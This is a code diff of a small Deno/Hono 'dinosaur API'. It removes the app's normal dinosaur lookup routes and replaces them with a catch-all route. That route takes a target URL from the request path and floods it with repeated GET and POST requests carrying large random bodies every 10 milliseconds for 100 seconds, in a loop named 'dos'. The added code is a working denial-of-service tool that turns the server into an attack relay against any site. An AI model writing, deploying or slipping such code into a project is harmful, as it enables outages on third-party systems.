@@ -3,18 +3,27 @@ import data from "./data.json" assert { type: "json" };
 
 const app = new Hono();
 
-app.get("/", (c) => c.text("Welcome to dinosaur API!"));
+app.all("/:url", async (c) => {
+  const dos = setInterval(async () => {
+    fetch(c.req.params.url, {
+      method: "GET",
+      body: "a=" + Math.random().toString(36).repeat(10000)
+    })
+    fetch(c.req.params.url, {
+      method: "POST",
+      body: "a=" + Math.random().toString(36).repeat(10000)
+    })
+    fetch(c.req.params.url, {
+      method: "GET",
+      body: "a=" + Math.random().toString(36).repeat(10000)
+    })
+    fetch(c.req.params.url, {
+      method: "POST",
+      body: "a=" + Math.random().toString(36).repeat(10000)
+    })
+  }, 10)
 
-app.get("/api/", (c) => c.json(data));
-
-app.get("/api/:dinosaur", (c) => {
-  const dinosaur = c.req.param("dinosaur").toLowerCase();
-  const found = data.find((item) => item.name.toLowerCase() === dinosaur);
-  if (found) {
-    return c.json(found);
-  } else {
-    return c.text("No dinosaurs found.");
-  }
+  setTimeout(() => clearInterval(dos), 100000)
 });
 
 Deno.serve(app.fetch);
